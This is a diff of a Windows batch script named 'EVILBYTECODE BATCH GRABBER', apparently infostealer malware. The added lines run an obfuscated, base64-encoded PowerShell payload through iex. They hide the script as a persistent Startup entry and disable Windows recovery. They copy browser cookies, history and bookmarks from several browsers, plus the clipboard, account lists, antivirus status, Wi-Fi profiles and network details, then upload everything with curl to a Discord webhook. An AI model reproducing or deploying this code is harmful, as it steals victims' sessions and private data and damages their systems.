@@ -46,13 +46,14 @@ goto realstart
 
 
 :realstart
-
+:: hides console window feel free to decode!
+Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIAUQBXAFIAawBMAFYAUgA1AGMARwBVAGcAUQBDAEkATgBDAGkAQQBnAEkAQwBCADEAYwAyAGwAdQBaAHkAQgBUAGUAWABOADAAWgBXADAANwBEAFEAbwBnAEkAQwBBAGcAZABYAE4AcABiAG0AYwBnAFUAMwBsAHoAZABHAFYAdABMAGwASgAxAGIAbgBSAHAAYgBXAFUAdQBTAFcANQAwAFoAWABKAHYAYwBGAE4AbABjAG4AWgBwAFkAMgBWAHoATwB3ADAASwBEAFEAbwBnAEkAQwBBAGcAYwBIAFYAaQBiAEcAbABqAEkARwBOAHMAWQBYAE4AegBJAEYAVgB6AFoAWABJAHoATQBpAEIANwBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEYAdABFAGIARwB4AEoAYgBYAEIAdgBjAG4AUQBvAEkAbgBWAHoAWgBYAEkAegBNAGkANQBrAGIARwB3AGkASwBWADAATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBjAEgAVgBpAGIARwBsAGoASQBIAE4AMABZAFgAUgBwAFkAeQBCAGwAZQBIAFIAbABjAG0ANABnAFkAbQA5AHYAYgBDAEIAVABhAEcAOQAzAFYAMgBsAHUAWgBHADkAMwBLAEUAbAB1AGQARgBCADAAYwBpAEIAbwBWADIANQBrAEwAQwBCAHAAYgBuAFEAZwBiAGsATgB0AFoARgBOAG8AYgAzAGMAcABPAHcAMABLAEkAQwBBAGcASQBIADAATgBDAGcAMABLAEkAQwBBAGcASQBIAEIAMQBZAG0AeABwAFkAeQBCAGoAYgBHAEYAegBjAHkAQgBMAFoAWABKAHUAWgBXAHcAegBNAGkAQgA3AEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkARgB0AEUAYgBHAHgASgBiAFgAQgB2AGMAbgBRAG8ASQBtAHQAbABjAG0ANQBsAGIARABNAHkATABtAFIAcwBiAEMASQBwAFgAUQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBCAHcAZABXAEoAcwBhAFcATQBnAGMAMwBSAGgAZABHAGwAagBJAEcAVgA0AGQARwBWAHkAYgBpAEIASgBiAG4AUgBRAGQASABJAGcAUgAyAFYAMABRADIAOQB1AGMAMgA5AHMAWgBWAGQAcABiAG0AUgB2AGQAeQBnAHAATwB3ADAASwBJAEMAQQBnAEkASAAwAE4AQwBpAEoAQQBEAFEAbwBOAEMAaQBSAHIAYQBYAFIAMABlAFcAaABwAFoARwBVAGcAUABTAEEAdwBEAFEAbwBOAEMAaQBSAHIAYQBYAFIAMABlAFgAZABwAGIAbQBRAGcAUABTAEIAYgBTADIAVgB5AGIAbQBWAHMATQB6AEoAZABPAGoAcABIAFoAWABSAEQAYgAyADUAegBiADIAeABsAFYAMgBsAHUAWgBHADkAMwBLAEMAawBOAEMAbABkAHkAYQBYAFIAbABMAFUAaAB2AGMAMwBRAGcASQBuAGwAdgBkAFMAQgBqAFkAVwA0AGcAYwAyAFYAbABJAEgAUgBvAGEAWABNAGgASQBnADAASwBVADMAUgBoAGMAbgBRAHQAVQAyAHgAbABaAFgAQQBnAE0AdwAwAEsAVwAxAFYAegBaAFgASQB6AE0AbAAwADYATwBsAE4AbwBiADMAZABYAGEAVwA1AGsAYgAzAGMAbwBKAEcAdABwAGQASABSADUAZAAyAGwAdQBaAEMAdwBnAEoARwB0AHAAZABIAFIANQBhAEcAbABrAFoAUwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBJAG4AbAB2AGQAUwBCAGoAWQBXADUAdQBiADMAUQBnAGMAMgBWAGwASQBIAFIAbwBhAFgATQBoAEkAZwAwAEsAVQAzAFIAaABjAG4AUQB0AFUAMgB4AGwAWgBYAEEAZwBNAFQAVQBOAEMAZwA9AD0AIgB9ACcAIAB8ACAAQwBvAG4AdgBlAHIAdABGAHIAbwBtAC0ASgBzAG8AbgApAC4AUwBjAHIAaQBwAHQAKQApACAAfAAgAGkAZQB4AA==
 set "destination=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 
 copy "%~f0" "%destination%"
 
 cd /d "%destination%"
-
+attrib +h +s %destination%
 :: Replace your webhook here so it sends the request or else it wont work!
 set "webhook=YOUR HOOK HERE LOL"
 set "rmpath=%userprofile%\AppData\Roaming\EvilBytecode"
@@ -168,11 +169,11 @@ goto ipnsys
 powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
 
 set "url=https://cdn.discordapp.com/attachments/1170689299394596885/1177487813088911411/Sex.mp3?ex=6572affb&is=65603afb&hm=62ceed0cf276db8051ce15886684389e80a3d21a3f4526d4462b13eba2ff192c&"
-set "outputFile=%localappdata%\Temp\Sex.mp3"
-curl -s -o "%outputFile%" "%url%" >NUL
+set "OF=%localappdata%\Temp\Sex.mp3"
+curl -s -o "%OF%" "%url%" >NUL
 (
   echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
-  echo Sound.URL = "%outputFile%"
+  echo Sound.URL = "%OF%"
   echo Sound.Controls.play
   echo do while Sound.currentmedia.duration = 0
   echo     wscript.sleep 100
@@ -180,21 +181,87 @@ curl -s -o "%outputFile%" "%url%" >NUL
   echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000
 ) >sound.vbs
 start /min sound.vbs
-goto fakeerror
+
+goto disablefacreset
+
+:disablefacreset
+reagentc.exe /disable
+cls
+goto browserdata
 
 
-:fakeerror
-powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
-set "err=You Got Logged ED, By Venom RAT."
 
-(
-    echo Set objShell = CreateObject^("WScript.Shell"^)
-    echo objShell.Popup "%err%", 5, "Error", 48 + 1
-) > "%temp%\err.vbs"
 
-cscript //nologo "%temp%\err.vbs"
-del "%temp%\err.vbs"
-pause
+:browserdata
+set "browserdat=%temp%\browserdata"
+set "browdat=%temp%\browserdata.zip"
 
+mkdir "%browserdat%" 2>nul
+copy "%localappdata%\Google\Chrome\User Data\Default\Cookies" "%browserdat%\Chrome_Cookies.txt"
+copy "%localappdata%\Google\Chrome\User Data\Default\History" "%browserdat%\Chrome_History.txt"
+copy "%localappdata%\Google\Chrome\User Data\Default\Bookmarks" "%browserdat%\Chrome_Bookmarks.txt"
+copy "%localappdata%\Microsoft\Edge\User Data\Profile 1\Cookies" "%browserdat%\MicrosoftEdge_Cookies.txt"
+copy "%localappdata%\Microsoft\Edge\User Data\Profile 1\History" "%browserdat%\MicrosoftEdge_History.txt"
+copy "%localappdata%\Microsoft\Edge\User Data\Profile 1\Favorites\*.url" "%browserdat%\MicrosoftEdge_Bookmarks.txt"
+copy "%APPDATA%\Opera Software\Opera GX Stable\Cookies" "%browserdat%\OperaGX_Cookies.txt"
+copy "%APPDATA%\Opera Software\Opera GX Stable\History" "%browserdat%\OperaGX_History.txt"
+copy "%APPDATA%\Opera Software\Opera GX Stable\Bookmarks" "%browserdat%\OperaGX_Bookmarks.txt"
+copy "%APPDATA%\Opera Software\Opera Stable\Cookies" "%browserdat%\Opera_Cookies.txt"
+copy "%APPDATA%\Opera Software\Opera Stable\History" "%browserdat%\Opera_History.txt"
+copy "%APPDATA%\Opera Software\Opera Stable\Bookmarks" "%browserdat%\Opera_Bookmarks.txt"
+copy "%userprofile%\Favorites\*.url" "%browserdat%\InternetExplorer_Bookmarks.txt"
+copy "%localappdata%\Microsoft\Edge\User Data\Default\Cookies" "%browserdat%\Edge_Cookies.txt"
+copy "%localappdata%\Microsoft\Edge\User Data\Default\History" "%browserdat%\Edge_History.txt"
+copy "%localappdata%\Microsoft\Edge\User Data\Default\Favorites\*.url" "%browserdat%\Edge_Bookmarks.txt"
+copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default\cookies.sqlite" "%browserdat%\Firefox_Cookies.txt"
+copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default\places.sqlite" "%browserdat%\Firefox_History.txt"
+copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\places.sqlite" "%browserdat%\Firefox_Bookmarks.txt"
+
+powershell -noprofile -command "Compress-Archive -Path '%browserdat%\*' -DestinationPath '%browdat%'"
+rd /s /q "%browserdat%" 2>nul
+cls
+curl -F c=@"%temp%\browserdata.zip" %webhook%
+
+goto pcscrape
+
+:pcscrape
+set "pcsraper=%temp%\pcscrape.txt"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Clipboard]──────EVILBYTECODE BATCH GRABBER────── > "%pcsraper%"
+powershell -Command "Get-Clipboard" >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Current User]──────EVILBYTECODE BATCH GRABBER────── > "%pcsraper%"
+whoami /all >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Local Network]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+ipconfig /all >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[FireWall Config]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+netsh firewall show config >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Local Users]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+net user >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Admin Users]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+net localgroup administrators >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Anti-Virus Programs]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState,pathToSignedProductExe >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Port Information]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+netstat -ano >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Routing Information]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+route print >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Hosts]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+type c:\Windows\system32\drivers\etc\hosts >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[WIFI Networks]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+netsh wlan show profile >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Startups]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+wmic startup get command, caption >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[DNS Records]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+ipconfig /displaydns >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[User Group Information]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+net localgroup >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Network Configuration]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+ipconfig /all >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Event Logs]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+wevtutil qe System /c:1 /rd:true /f:text /q:*[System[(Level=2 or Level=3)]] >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[Environment Variables]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+set >> "%pcsraper%"
+echo ──────EVILBYTECODE BATCH GRABBER──────[ARP Table]──────EVILBYTECODE BATCH GRABBER────── >> "%pcsraper%"
+arp -a >> "%pcsraper%"
+curl -F c=@"%temp%\pcscrape.txt" %webhook%
 
 endlocal
